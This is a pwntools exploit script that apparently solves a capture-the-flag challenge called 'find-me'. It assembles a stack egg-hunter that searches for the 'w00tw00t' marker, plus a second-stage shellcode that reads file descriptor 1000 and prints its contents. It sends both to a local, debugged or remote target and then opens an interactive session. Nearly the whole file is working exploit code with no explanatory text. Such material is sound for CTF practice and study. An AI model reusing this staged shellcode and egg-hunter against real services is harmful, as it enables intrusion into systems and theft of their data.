from pwn import *
import re

PROGRAM_PATH = (Path(__file__).parent / "find-me").resolve().__str__()
BIG_BUFF_SIZE = 256
FD = 1000
# BUFF_SIZE = 0x88
# CANARY = 123456789
# This shell code is 23 bytes

gdb_script = """
b *main
b *main+1006
b *main+1161
c
"""


# open-fd2.s
# Big shellcode max size = 256
BigAsm = """
_start:
    xor     eax, eax            
    mov     edi, 1000
    sub     rsp, 0x400
    mov     rsi, rsp
    mov     edx, 0x400
    syscall                     

    mov     edx, eax
    mov     edi, 1              
    mov     eax, 1              
    syscall

    xor     edi, edi
    mov     eax, 60             
    syscall
"""
# above shellcode is 47 bytes.... Put it in the big stack
# WE NEED THE EXIT(0)

BigShellCode = asm(BigAsm, extract=True, arch="amd64", os="linux")
BigShellCodeLen = len(BigShellCode)
print("____________________________________")

print(f"Big Shellcode: {BigShellCode}")
print(f"Big Shellcode length: {BigShellCodeLen}")


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvuntil(delims="new stack")
print("____________________________________")
print(res)

print("____________________________________")
# Get the stack address
res = io.recvline()
res = io.recvlinesS(1)
print(res)
match = re.search(r"0x[0-9a-fA-F]+", res[0])
stck_addr = match.group(0)
print(f"stack address received: {stck_addr}")
stack_addr_int = int(stck_addr, 16)


# print("____________________________________")
# Get the stack address
# res = io.recvlines(2)
# print(res)


# le = p64(int(CANARY, 16), "little")
# be = p64(int(CANARY, 16), endianness="big")
NOP = b"\x90"
Signature = b"w00tw00t"
# This works
BigPayload = Signature + NOP * (16 - BigShellCodeLen % 16 + 16 - 4) + BigShellCode

# This works too!
# payload = NOP * (BUFF_SIZE - BigShellCodeLen) + BigShellCode
# payload = shellcode + NOP * (BUFF_SIZE - shellcode_len)

# THIS WORKS
# loopSHellCodeBare.s
OFFSET = 1_000_000
stack_addr_int = stack_addr_int + OFFSET

# smallAsm = f"""
# _start:
#     mov rsi, {hex(stack_addr_int)}
#     mov rax, 0x7430307730303077
# findNOP:
#     cmp qword [rsi], rax
#     je found
#     inc rsi
#     jmp findNOP
# found:
#     jmp [rsi+8]
# """

smallAsm = r"""
_start:
    mov rsi, rsp
    mov rax, 0x7430307730303077
L:
    cmp qword [rsi], rax
    je  F
    inc rsi
    jmp L
F:
    add rsi, 8
    jmp rsi
"""
# bfc03190
smallShellCode = asm(smallAsm, extract=True, arch="amd64", os="linux")
smallShellCodeLen = len(smallShellCode)


print("____________________________________")

print(f"small Shellcode: {smallShellCode.hex()}")
# print(f"small Shellcode: {smallShellCode}")
print(f"small Shellcode length: {smallShellCodeLen}")
print(f"disassm: {disasm(smallShellCode)}")

print("____________________________________")
print(f"Sending small shellcode")
io.sendline(smallShellCode)

print("____________________________________")
print(f"Sending big shellcode")
print(f"Big payload len: {len(BigPayload)}")
print(f"Big payload: {(BigPayload.hex())}")


print(BigPayload)
io.sendline(BigPayload)


io.interactive()

# io.sendline(10 * NOP)
# res = io.recvline().decode("ascii")
# print(res)
